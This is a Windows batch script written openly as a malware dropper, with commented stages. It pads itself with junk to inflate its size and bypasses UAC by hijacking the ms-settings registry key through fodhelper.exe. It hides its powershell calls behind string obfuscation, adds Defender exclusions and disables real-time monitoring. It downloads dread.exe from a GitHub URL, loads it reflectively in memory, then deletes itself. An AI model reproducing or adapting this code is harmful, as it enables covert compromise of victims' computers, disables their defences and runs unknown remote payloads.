@echo off
setlocal enabledelayedexpansion

:: --- [STAGE 1: JUNK DATA] ---
:: Copy-paste more junk here to hit the 5MB+ size mark
set "j=%random%%random%%random%%random%%random%"

:: --- [STAGE 2: SILENT UAC BYPASS] ---
net session >nul 2>&1
if %errorLevel% neq 0 (
    set "r=HKCU\Software\Classes\ms-settings\shell\open\command"
    reg add "!r!" /v "DelegateExecute" /d "" /f >nul 2>&1
    reg add "!r!" /v "" /d "cmd.exe /c %~fnx0" /f >nul 2>&1
    start "" fodhelper.exe
    exit /b
)
reg delete "HKCU\Software\Classes\ms-settings" /f >nul 2>&1

:: --- [STAGE 3: DEFENDER BYPASS] ---
:: Masking the powershell command
set "K=0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ -_.:/\"
set "ps=!K:25,1!!K:24,1!!K:32,1!!K:14,1!!K:27,1!!K:28,1!!K:17,1!!K:14,1!!K:21,1!!K:21,1!"
set "a=-ExecutionPolicy Bypass -WindowStyle Hidden -Command"

:: Add exclusions so the injection doesn't get flagged mid-process
!ps! !a! "Add-MpPreference -ExclusionProcess 'powershell.exe','explorer.exe'"
!ps! !a! "Set-MpPreference -DisableRealtimeMonitoring $true"

:: --- [STAGE 4: REFLECTIVE INJECTION] ---
:: This downloads dread.exe and runs it INSIDE the current process memory
set "url=https://raw.githubusercontent.com/fullylaw/happy.org/main/dread.exe"

set "cmd=$b=(New-Object Net.WebClient).DownloadData('!url!');"
set "cmd=!cmd! [System.Reflection.Assembly]::Load($b).EntryPoint.Invoke($null,$null);"

!ps! !a! "!cmd!"

:: --- [STAGE 5: SELF DESTRUCT] ---
(goto) 2>nul & del "%~f0"
exit
